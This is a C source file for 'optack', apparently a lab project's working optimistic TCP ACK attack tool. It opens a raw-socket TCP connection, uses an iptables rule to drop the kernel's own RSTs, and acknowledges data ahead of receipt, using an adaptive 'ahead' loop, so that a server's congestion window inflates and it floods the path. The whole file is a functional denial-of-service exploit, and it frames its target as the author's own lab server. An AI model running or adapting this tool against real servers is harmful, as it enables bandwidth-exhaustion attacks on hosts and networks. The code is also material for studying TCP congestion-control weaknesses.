/*
 * optack -- optimistic TCP ACK attack tool (Milestone 2).
 *
 * A misbehaving TCP *receiver*: it opens a connection to our streaming server
 * and then acknowledges data BEFORE (or without ever) receiving it. To the
 * server this looks like a perfect, near-zero-RTT network, so its congestion
 * window inflates without bound and it transmits far faster than the real
 * path can carry -- the classic Savage'99 / Sherwood'05 attack.
 *
 * Design (see PROJECT_IMPLEMENTATION_PLAN.md, section 1):
 *   - The ENTIRE connection, including the 3-way handshake, is driven from a
 *     raw socket. The host kernel never has a TCB for this 4-tuple, so there
 *     is no "two stack" fight between the kernel and this tool.
 *   - Because the kernel has no socket on our source port, it would answer the
 *     server's SYN-ACK with a RST and kill the connection. We stop that by
 *     installing an iptables rule that drops outbound RSTs toward the server
 *     for the duration of the run (removed again on exit). Needs NET_ADMIN.
 *   - Raw packet send needs NET_RAW. Both caps are granted to the attacker
 *     container in docker-compose.yml.
 *
 * ACK strategy: two modes.
 *   --lazy  : acknowledge only data actually received (a non-responsive flow;
 *             never signals loss). Weaker, but rock-solid -- the plan's
 *             fallback if the optimistic predictor won't stay in sync.
 *   default : predictive optimistic ACKs. We watch how fast the highest
 *             received sequence number climbs, estimate the server's send
 *             rate, and push our ACK a short "horizon" ahead of the newest
 *             byte we have actually seen -- i.e. we ACK data the server has
 *             sent but that is still in flight or was dropped downstream.
 *             Over-shoot is bounded and the ACK is monotonic, so the flow
 *             self-heals instead of dead-locking (Sherwood Algorithm 1, with
 *             overrun recovery).
 *
 * This tool attacks OUR OWN server on a private lab network. Do not point it
 * at anything you do not own.
 *
 * Build: gcc -O2 -Wall -o attack optack.c
 * Usage: ./attack --target server --port 5000 [--duration 15] [--lazy] [-v]
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <poll.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

/* ----- signed-wraparound sequence comparisons (RFC 1323 style) ----- */
#define SEQ_LT(a, b) ((int32_t)((a) - (b)) < 0)
#define SEQ_GT(a, b) ((int32_t)((a) - (b)) > 0)
#define SEQ_GEQ(a, b) ((int32_t)((a) - (b)) >= 0)

static volatile sig_atomic_t g_running = 1;
static void on_signal(int sig) { (void)sig; g_running = 0; }

/* Standard 16-bit one's-complement checksum. */
static uint16_t checksum16(const void *data, size_t len) {
    const uint16_t *p = data;
    uint32_t sum = 0;
    while (len > 1) { sum += *p++; len -= 2; }
    if (len) sum += *(const uint8_t *)p;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)~sum;
}

/* TCP checksum over the IPv4 pseudo-header + TCP header + payload. */
static uint16_t tcp_checksum(uint32_t src, uint32_t dst,
                             const void *tcp, size_t tcp_len) {
    struct {
        uint32_t src;
        uint32_t dst;
        uint8_t zero;
        uint8_t proto;
        uint16_t len;
    } __attribute__((packed)) ph = {
        src, dst, 0, IPPROTO_TCP, htons((uint16_t)tcp_len)
    };
    size_t buflen = sizeof(ph) + tcp_len;
    uint8_t *buf = malloc(buflen);
    memcpy(buf, &ph, sizeof(ph));
    memcpy(buf + sizeof(ph), tcp, tcp_len);
    uint16_t c = checksum16(buf, buflen);
    free(buf);
    return c;
}

/* Discover which local source address the kernel would use to reach dst. */
static uint32_t local_ip_for(uint32_t dst_be) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in a = {0};
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = dst_be;
    a.sin_port = htons(9);
    uint32_t out = 0;
    if (connect(s, (struct sockaddr *)&a, sizeof(a)) == 0) {
        struct sockaddr_in la;
        socklen_t ll = sizeof(la);
        if (getsockname(s, (struct sockaddr *)&la, &ll) == 0)
            out = la.sin_addr.s_addr;
    }
    close(s);
    return out;
}

/* now() in seconds as a double, from a monotonic clock. */
static double now_s(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
}

/* Connection / attack parameters. */
struct cfg {
    uint32_t src_ip, dst_ip;   /* network byte order */
    uint16_t src_port, dst_port;
    int lazy;
    int verbose;
    double duration;
    uint8_t wscale;            /* window scale shift we advertise */
    uint16_t adv_win;          /* window field value (before scaling) */
    uint32_t max_ahead;        /* ceiling on optimism (bytes ahead of real data) */
    double interval_ms;        /* time between ACKs */
};

/*
 * Build an IPv4 + TCP packet into buf. Returns total length.
 * opts/optlen: TCP options (already 4-byte aligned) or NULL.
 */
static size_t build_packet(uint8_t *buf, const struct cfg *c,
                           uint32_t seq, uint32_t ack, uint8_t flags,
                           uint16_t win, const uint8_t *opts, size_t optlen) {
    struct iphdr *ip = (struct iphdr *)buf;
    struct tcphdr *tcp = (struct tcphdr *)(buf + sizeof(*ip));
    size_t tcp_len = sizeof(*tcp) + optlen;
    size_t tot = sizeof(*ip) + tcp_len;

    memset(buf, 0, tot);
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons((uint16_t)tot);
    ip->id = htons((uint16_t)(seq ^ ack));
    ip->frag_off = htons(0x4000); /* don't fragment */
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr = c->src_ip;
    ip->daddr = c->dst_ip;
    ip->check = checksum16(ip, sizeof(*ip));

    tcp->source = htons(c->src_port);
    tcp->dest = htons(c->dst_port);
    tcp->seq = htonl(seq);
    tcp->ack_seq = htonl(ack);
    tcp->doff = (uint16_t)(tcp_len / 4);
    tcp->fin = (flags & TH_FIN) ? 1 : 0;
    tcp->syn = (flags & TH_SYN) ? 1 : 0;
    tcp->rst = (flags & TH_RST) ? 1 : 0;
    tcp->psh = (flags & TH_PUSH) ? 1 : 0;
    tcp->ack = (flags & TH_ACK) ? 1 : 0;
    tcp->window = htons(win);
    if (opts && optlen) memcpy((uint8_t *)tcp + sizeof(*tcp), opts, optlen);
    tcp->check = tcp_checksum(c->src_ip, c->dst_ip, tcp, tcp_len);
    return tot;
}

static int send_pkt(int fd, const struct cfg *c, const uint8_t *buf, size_t len) {
    struct sockaddr_in to = {0};
    to.sin_family = AF_INET;
    to.sin_addr.s_addr = c->dst_ip;
    to.sin_port = c->dst_port;
    return sendto(fd, buf, len, 0, (struct sockaddr *)&to, sizeof(to));
}

/* True when a received IP/TCP packet belongs to our connection. */
static int is_ours(const struct iphdr *ip, const struct tcphdr *tcp,
                   const struct cfg *c) {
    return ip->saddr == c->dst_ip && ip->daddr == c->src_ip &&
           tcp->source == htons(c->dst_port) &&
           tcp->dest == htons(c->src_port);
}

/* run iptables to add ("-A") or remove ("-D") the outbound-RST suppressor. */
static void rst_rule(const char *op, const char *target_ip) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd),
             "iptables %s OUTPUT -p tcp --tcp-flags RST RST -d %s -j DROP 2>/dev/null",
             op, target_ip);
    if (system(cmd) != 0 && strcmp(op, "-A") == 0)
        fprintf(stderr, "[optack] WARNING: could not add iptables RST rule "
                        "(need NET_ADMIN + iptables). Kernel may RST the flow.\n");
}

int main(int argc, char **argv) {
    struct cfg c = {
        .src_port = 0, .dst_port = 5000, .lazy = 0, .verbose = 0,
        .duration = 15.0, .wscale = 7, .adv_win = 65535,
        .max_ahead = 4u * 1024 * 1024, .interval_ms = 1.0,
    };
    const char *target = "server";

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--target") && i + 1 < argc) target = argv[++i];
        else if (!strcmp(argv[i], "--port") && i + 1 < argc) c.dst_port = (uint16_t)atoi(argv[++i]);
        else if (!strcmp(argv[i], "--duration") && i + 1 < argc) c.duration = atof(argv[++i]);
        else if (!strcmp(argv[i], "--maxahead") && i + 1 < argc) c.max_ahead = (uint32_t)atoi(argv[++i]) * 1024u;
        else if (!strcmp(argv[i], "--interval") && i + 1 < argc) c.interval_ms = atof(argv[++i]);
        else if (!strcmp(argv[i], "--lazy")) c.lazy = 1;
        else if (!strcmp(argv[i], "-v") || !strcmp(argv[i], "--verbose")) c.verbose = 1;
        else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
            printf("usage: %s --target <host> --port <p> [--duration s] "
                   "[--maxahead KB] [--interval ms] [--lazy] [-v]\n", argv[0]);
            return 0;
        } else {
            fprintf(stderr, "unknown arg: %s\n", argv[i]);
            return 2;
        }
    }

    /* Resolve target to an IPv4 address. */
    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(target, NULL, &hints, &res) != 0 || !res) {
        fprintf(stderr, "[optack] cannot resolve '%s'\n", target);
        return 1;
    }
    c.dst_ip = ((struct sockaddr_in *)res->ai_addr)->sin_addr.s_addr;
    freeaddrinfo(res);
    c.src_ip = local_ip_for(c.dst_ip);
    if (!c.src_ip) { fprintf(stderr, "[optack] cannot find local source IP\n"); return 1; }

    srand((unsigned)(getpid() ^ (unsigned)time(NULL)));
    c.src_port = (uint16_t)(20000 + rand() % 40000);
    uint32_t isn = (uint32_t)rand() ^ ((uint32_t)rand() << 16);

    char dst_str[INET_ADDRSTRLEN], src_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &c.dst_ip, dst_str, sizeof(dst_str));
    inet_ntop(AF_INET, &c.src_ip, src_str, sizeof(src_str));
    fprintf(stderr, "[optack] %s:%u  ->  %s:%u   (mode=%s, isn=%u)\n",
            src_str, c.src_port, dst_str, c.dst_port,
            c.lazy ? "lazy" : "optimistic", isn);

    signal(SIGINT, on_signal);
    signal(SIGTERM, on_signal);

    int sfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sfd < 0) { perror("socket(send)"); return 1; }
    int one = 1;
    if (setsockopt(sfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("IP_HDRINCL"); return 1;
    }
    int rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (rfd < 0) { perror("socket(recv)"); return 1; }

    rst_rule("-A", dst_str);

    uint8_t buf[2048];

    /* ---- 3-way handshake ---- */
    /* SYN with MSS 1460 + window scale. */
    uint8_t synopt[8] = {
        2, 4, 0x05, 0xb4,       /* MSS = 1460 */
        1,                       /* NOP */
        3, 3, c.wscale,          /* window scale */
    };
    size_t len = build_packet(buf, &c, isn, 0, TH_SYN, c.adv_win, synopt, sizeof(synopt));

    uint32_t server_isn = 0;
    int established = 0;
    for (int attempt = 0; attempt < 10 && g_running && !established; attempt++) {
        send_pkt(sfd, &c, buf, len);
        double deadline = now_s() + 0.5;
        while (now_s() < deadline && g_running) {
            struct pollfd pfd = { rfd, POLLIN, 0 };
            if (poll(&pfd, 1, 100) <= 0) continue;
            uint8_t rb[2048];
            ssize_t n = recv(rfd, rb, sizeof(rb), 0);
            if (n < (ssize_t)(sizeof(struct iphdr) + sizeof(struct tcphdr))) continue;
            struct iphdr *ip = (struct iphdr *)rb;
            struct tcphdr *tcp = (struct tcphdr *)(rb + ip->ihl * 4);
            if (!is_ours(ip, tcp, &c)) continue;
            if (tcp->syn && tcp->ack) {
                server_isn = ntohl(tcp->seq);
                established = 1;
                break;
            }
            if (tcp->rst) {
                fprintf(stderr, "[optack] server refused the connection (RST)\n");
                rst_rule("-D", dst_str);
                return 1;
            }
        }
    }
    if (!established) {
        fprintf(stderr, "[optack] handshake failed (no SYN-ACK)\n");
        rst_rule("-D", dst_str);
        return 1;
    }

    uint32_t my_seq = isn + 1;         /* our data seq (we send no payload) */
    uint32_t rcv_nxt = server_isn + 1; /* highest byte we have actually seen */
    uint32_t ack_no = rcv_nxt;         /* what we will claim to have received */

    /* Final ACK completes the handshake; the server starts streaming. */
    len = build_packet(buf, &c, my_seq, ack_no, TH_ACK, c.adv_win, NULL, 0);
    send_pkt(sfd, &c, buf, len);
    fprintf(stderr, "[optack] connection established, streaming begins\n");

    /* ---- attack loop ----
     *
     * The optimism is a single number, `ahead`: how many bytes past the newest
     * byte we have actually seen we are willing to acknowledge. We cannot know
     * the server's real snd_nxt, so we tune `ahead` by feedback (AIMD):
     *   - while the server keeps sending us fresh data, our ACKs are landing
     *     in the valid (snd_una, snd_nxt] window, so we push harder: additively
     *     grow `ahead`;
     *   - if the flow stalls (no new bytes for one evaluation window) our ACKs
     *     have overrun snd_nxt and are being ignored, so we back off: halve
     *     `ahead`.
     * The ACK we send is always rcv_nxt + ahead, which is >= rcv_nxt, so it is
     * never a duplicate; and `ahead` can always shrink back toward zero, so the
     * flow can never dead-lock. On a lossy/high-delay path `ahead` climbs to the
     * ceiling and we acknowledge data that was sent but never reached us -- the
     * optimistic ACK. */
    const uint32_t AI_STEP = 12u * 1460;     /* additive increase per window */
    const double EVAL_S = 0.005;             /* feedback evaluation window */
    uint32_t ahead = 0;
    double t0 = now_s();
    double next_ack = t0;
    double eval_t = t0;
    uint32_t eval_base = rcv_nxt;
    unsigned long long acks_sent = 0, bytes_seen = 0;

    while (g_running && (now_s() - t0) < c.duration) {
        double t = now_s();
        int timeout_ms = (int)((next_ack - t) * 1000.0);
        if (timeout_ms < 0) timeout_ms = 0;

        struct pollfd pfd = { rfd, POLLIN, 0 };
        if (poll(&pfd, 1, timeout_ms) > 0) {
            uint8_t rb[65536];
            ssize_t n;
            while ((n = recv(rfd, rb, sizeof(rb), MSG_DONTWAIT)) > 0) {
                if (n < (ssize_t)(sizeof(struct iphdr) + sizeof(struct tcphdr))) continue;
                struct iphdr *ip = (struct iphdr *)rb;
                struct tcphdr *tcp = (struct tcphdr *)(rb + ip->ihl * 4);
                if (!is_ours(ip, tcp, &c)) continue;
                if (tcp->rst) { fprintf(stderr, "[optack] got RST, stopping\n"); g_running = 0; break; }
                size_t hdrs = ip->ihl * 4 + tcp->doff * 4;
                size_t payload = ntohs(ip->tot_len) > hdrs ? ntohs(ip->tot_len) - hdrs : 0;
                if (payload > 0) {
                    uint32_t seq = ntohl(tcp->seq);
                    uint32_t end = seq + (uint32_t)payload;
                    if (SEQ_GT(end, rcv_nxt)) { bytes_seen += end - rcv_nxt; rcv_nxt = end; }
                }
            }
        }

        t = now_s();

        /* AIMD feedback on the optimism level, once per evaluation window. */
        if (!c.lazy && t - eval_t >= EVAL_S) {
            if (SEQ_GT(rcv_nxt, eval_base)) {         /* fresh data -> push */
                ahead += AI_STEP;
                if (ahead > c.max_ahead) ahead = c.max_ahead;
            } else {                                  /* stalled -> back off */
                ahead /= 2;
            }
            eval_base = rcv_nxt;
            eval_t = t;
        }

        if (t < next_ack) continue;
        next_ack = t + c.interval_ms / 1000.0;

        ack_no = c.lazy ? rcv_nxt : rcv_nxt + ahead;

        len = build_packet(buf, &c, my_seq, ack_no, TH_ACK, c.adv_win, NULL, 0);
        send_pkt(sfd, &c, buf, len);
        acks_sent++;

        if (c.verbose && (acks_sent % 1000 == 0)) {
            fprintf(stderr, "[optack] t=%.1fs recv=%.2f MB ack-ahead=%uKB acks=%llu\n",
                    t - t0, (rcv_nxt - (server_isn + 1)) / 1e6,
                    ahead / 1024, acks_sent);
        }
    }

    /* ---- teardown ---- */
    rst_rule("-D", dst_str);                 /* remove rule BEFORE sending RST */
    len = build_packet(buf, &c, my_seq, rcv_nxt, TH_RST | TH_ACK, 0, NULL, 0);
    send_pkt(sfd, &c, buf, len);

    double elapsed = now_s() - t0;
    fprintf(stderr, "[optack] done: %.1fs, %llu ACKs sent, %llu bytes seen "
                    "(%.2f Mbit/s received), final optimism %+d bytes\n",
            elapsed, acks_sent, bytes_seen, bytes_seen * 8.0 / (elapsed * 1e6),
            (int)(ack_no - rcv_nxt));

    close(sfd);
    close(rfd);
    return 0;
}
